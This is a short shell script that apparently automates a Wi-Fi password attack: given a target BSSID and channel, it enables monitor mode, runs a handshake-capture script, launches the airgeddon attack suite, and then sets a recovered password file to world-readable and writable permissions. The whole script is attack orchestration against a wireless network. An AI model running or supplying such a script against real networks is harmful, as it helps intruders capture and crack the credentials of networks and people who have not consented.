bssid=$1
channel=$2
sudo ./startmonitor.sh
sleep 2
sudo ./handshake.sh $bssid $channel
sleep 2
sudo airgeddon
sleep 2
sudo ./stopmonitor.sh
sleep 2
sudo chmod 777 ./output/password.txt

